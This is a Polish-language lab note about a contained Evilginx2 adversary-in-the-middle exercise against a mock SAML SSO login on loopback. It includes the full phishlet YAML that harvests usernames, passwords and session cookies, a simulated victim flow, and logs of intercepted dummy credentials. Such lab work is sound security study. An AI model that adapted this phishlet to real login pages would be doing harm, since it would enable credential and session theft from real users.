---
title: "Evilginx2 Phishlet: mocksso (sso.local, SAML login)"
date: 2026-08-16
tags: [evilginx2, phishlet, aitm, saml, lab, symulacja]
status: active
category: lab
---

# Evilginx2 Phishlet: mocksso

Trzeci phishlet w labie AiTM — mock SSO z loginem w stylu SAML (`/saml/login`).
Wszystko na loopback, bez realnych domen. Powiązane: [[Evilginx2_Lab]] · [[Evilginx2_Phishlet_mockbank]] · [[Lab/Hosts]].

## Komponenty

| Element | Ścieżka / wartość |
|---|---|
| Phishlet | `/opt/evilginx2/phishlets/mocksso.yaml` |
| Mock origin | `/opt/evilginx2/mock_sso_origin.py` — HTTPS na **127.0.0.4:443** (`sso.local`) |
| Cert | `/opt/evilginx2/sso.local.{crt,key}` — self-signed, SAN `sso.local`, IP `127.0.0.4` |
| Hosts | `127.0.0.4 sso.local` w `/etc/hosts` |
| Phish domena | `sso.local` (evilginx na 127.0.0.1:8443) |
| Lure | id 4, path `/hjRAvzQq` |

## Phishlet (mocksso.yaml)

```yaml
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'sso.local', session: true, is_landing: true}
auth_tokens:
  - domain: .sso.local
    keys: ['session']
credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'sso.local'
  path: '/saml/login'
```

## Flow ofiary (symulacja, /tmp/sso_demo.py)

1. `GET /hjRAvzQq` (lure) → **302** → `https://sso.local/saml/login` + cookie śledzące (`37eb-f26a=...; Domain=local`)
2. `GET /saml/login` → **200** (form SAML: username+password)
3. `POST /saml/login` (username+password) → **302** → `/dashboard` + **cookie rewrite**: `session=MOCKSSO_alice@corp.local; Domain=sso.local`
4. `GET /dashboard` → **200** `WELCOME, authenticated user`

## Przechwycenie (zweryfikowane)

```
[14:41:58] [+++] [0] Username: [alice@corp.local]
[14:41:58] [+++] [0] Password: [Passw0rd!]
[14:41:58] [+++] [0] all authorization tokens intercepted!
```

Sesja 12 w `sessions`:

```
 id           : 12
 phishlet     : mocksso
 username     : alice@corp.local
 password     : Passw0rd!
 tokens       : captured
 landing url  : https://sso.local/hjRAvzQq
 [ cookies ]
  session = MOCKSSO_alice@corp.local  (domain .sso.local)
```

## Uwagi techniczne

- Domena bazowa `local` (ustawiona przy mockbank) — `sso.local` przeszedł walidację bez zmian, mockbank/mocklogin **przetrwały restart** (config.json).
- Ścieżka logowania to `/saml/login` — evilginx parsuje ją z `login.path`; username/password łapane z POST body niezależnie od kształtu ścieżki (match po kluczu formularza).
- Klient testowy: SNI=`sso.local` na 127.0.0.1:8443 + parser HTTP (Content-Length/chunked) — te same artefakty co w [[Evilginx2_Phishlet_mockbank]].

## Status phishletów w labie

| Phishlet | Domena | Login path | Status |
|---|---|---|---|
| mocklogin | evil.local | /login | enabled |
| mockbank | bank.local | /login (+2FA /verify) | enabled |
| mocksso | sso.local | /saml/login | enabled |

## Reguły

1. Tylko loopback, `-developer`, self-signed, bez LE.
2. Mock origin to lokalna atrapa — brak realnych serwisów.
3. Sesje z dema wyczyścić po zakończeniu.
